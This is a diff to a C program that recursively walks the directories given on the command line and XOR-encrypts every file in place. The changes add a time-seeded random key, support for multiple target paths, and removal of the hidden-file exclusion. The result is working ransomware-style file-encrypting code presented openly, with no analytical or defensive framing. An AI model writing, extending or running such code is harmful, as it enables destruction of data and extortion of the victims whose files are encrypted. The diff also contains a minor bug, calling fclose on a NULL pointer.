@@ -5,6 +5,8 @@
 #include <ftw.h>
 #include <sys/stat.h>
 #include <string.h>
+#include <time.h>
+#include <errno.h>
 
 struct filez {
 	uint8_t *buffer;
@@ -22,19 +24,41 @@ int check(const char *);
 
 Filez file;
 
+uint8_t key[20];
+
 int main(int argc,const char *argv[]) {
 	const char *path;
+	const char *path_array[argc-1];
 	// get starting path
-	if (argc == 1) {
-		path = "/home";
-	} else if (argc == 2) {
-		path = argv[1];
+	//if (argc == 1) {
+	//	path = "/home";
+	//} else if (argc == 2) {
+	if (argc < 2) {
+		printf("Usage: %s <path1> <path2>\n", argv[0]);
 	} else {
-		printf("Usage: %s <starting path>\n", argv[0]);
-	}
+		// get paths
+		for (int i = 1; i < argc; i++) {
+			path_array[i-1] = argv[i];
+		}
+		/*for (int i = 0; i < argc-1; i++) {
+			printf("%s\n", path_array[i]);
+		}
+		return 0;*/
 
-	// start encryption
-	ftw(path, list, 1);
+	
+		// generate key
+		srand(time(NULL));
+		for (int i = 0; i < 20; i++) {
+			key[i] = (rand() % 26) + 65;
+		}
+		printf("key = %s\n", key);
+	
+		// start encryption
+		for (int i = 0; i < argc-1; i++) {
+			ftw(path_array[i], list, 1);
+			printf("%s encrypted\n", path_array[i]);
+		}
+	}
 
 	return 0;
 }
@@ -44,7 +68,7 @@ void encryptFile(const char* array) {
 	if (readfile(array) == 1) {
 		return;
 	}
-	
+
 	// encrypt file
 	encryptDecrypt(file.buffer, file.size);
 
@@ -60,11 +84,13 @@ int list(const char *name, const struct stat *status, int type) {
 
 	if(type == FTW_F) {
 		// ignore hidden files
-		if (strstr(name, "/.") == NULL) {
+		/*if (strstr(name, "/.") == NULL) {
 			if (check(name) == 0) {
 				encryptFile(name);
 			}
-		}
+		}*/
+		//printf("%s\n", name);
+		encryptFile(name);
 	}
 
 	return 0;
@@ -123,7 +149,7 @@ int check(const char *name) {
 }
 
 void encryptDecrypt(uint8_t *input, uint64_t size) {
-	uint8_t key[] = {'A', 'B', 'C'}; //Can be any chars, and any size array
+	//uint8_t key[] = {'A', 'B', 'C'}; //Can be any chars, and any size array
 	
 	for(int i = 0; i < size; i++) {
 		input[i] = input[i] ^ key[i % (sizeof(key)/sizeof(uint8_t))];
@@ -143,7 +169,9 @@ void writefile(const uint8_t *name, uint8_t *content, uint64_t size) {
 int readfile(const uint8_t *name) {
 	// get file pointer
 	FILE *fp = fopen(name, "rb");
+
 	if (fp == NULL) {
+		//printf("errno %d \n", errno);
 		fclose(fp);
 		return 1;
 	}
